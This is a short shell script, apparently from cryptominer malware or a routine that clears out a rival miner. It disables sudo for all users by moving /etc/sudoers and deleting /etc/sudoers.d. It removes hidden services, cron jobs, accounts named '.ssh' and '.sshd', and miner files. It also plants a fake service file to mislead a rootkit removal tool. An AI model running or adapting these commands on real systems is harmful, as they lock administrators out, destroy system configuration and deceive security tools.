# Disable sudo for all users
mv -f /etc/sudoers{,.bak}
rm -f /etc/sudoers.d/*

# Stop and remove services
systemctl stop sysnet
systemctl stop systems
rm /lib/systemd/system/sysnet.service
rm /etc/systemd/system/sysnet.service
rm /lib/systemd/system/systems.service
rm /etc/systemd/system/systems.service
systemctl daemon-reload

# Remove cron tasks
rm -rf /etc/cron.daily/libct
rm -rf /etc/cron.hourly/chk
rm -rf /etc/cron.hourly/syszc
rm -rf /etc/cron.minly/.sysbak

# Remove created users
userdel .ssh
userdel .sshd

# Remove executables
rm -rf /opt/minerapp/var/.system
rm -rf /var/.hang
rm -rf /etc/cache

# Create fake marker for RootKit Removal Tool
touch /etc/systemd/system/synctl.service
